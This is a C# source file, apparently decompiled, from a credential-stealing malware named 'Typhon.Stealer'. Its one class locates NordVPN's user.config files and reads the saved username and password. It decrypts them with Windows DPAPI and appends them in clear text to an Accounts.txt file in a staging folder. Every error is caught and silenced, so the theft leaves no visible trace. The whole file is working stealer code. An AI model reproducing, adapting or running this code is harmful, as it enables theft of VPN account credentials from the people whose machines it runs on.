using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Typhon.Stealer.Software.VPN
{
	// Token: 0x0200000E RID: 14
	internal class Class1
	{
		// Token: 0x0600004E RID: 78 RVA: 0x0000421C File Offset: 0x0000241C
		private static string Decode(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004260 File Offset: 0x00002460
		public static void Save(string sSavePath)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
			if (!directoryInfo.Exists)
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
					{
						string text = Path.Combine(directoryInfo2.FullName, "user.config");
						if (File.Exists(text))
						{
							Directory.CreateDirectory(sSavePath + "\\" + directoryInfo2.Name);
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text);
							XmlNode xmlNode = xmlDocument.SelectSingleNode("//setting[@name='Username']/value");
							string text2 = (xmlNode != null) ? xmlNode.InnerText : null;
							XmlNode xmlNode2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value");
							string text3 = (xmlNode2 != null) ? xmlNode2.InnerText : null;
							if (text2 != null && !string.IsNullOrEmpty(text2) && text3 != null && !string.IsNullOrEmpty(text3))
							{
								string text4 = Class1.Decode(text2);
								string text5 = Class1.Decode(text3);
								File.AppendAllText(sSavePath + "\\" + directoryInfo2.Name + "\\Accounts.txt", string.Concat(new string[]
								{
									"Username: ",
									text4,
									"\nPassword: ",
									text5,
									"\n====================\n\n"
								}));
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
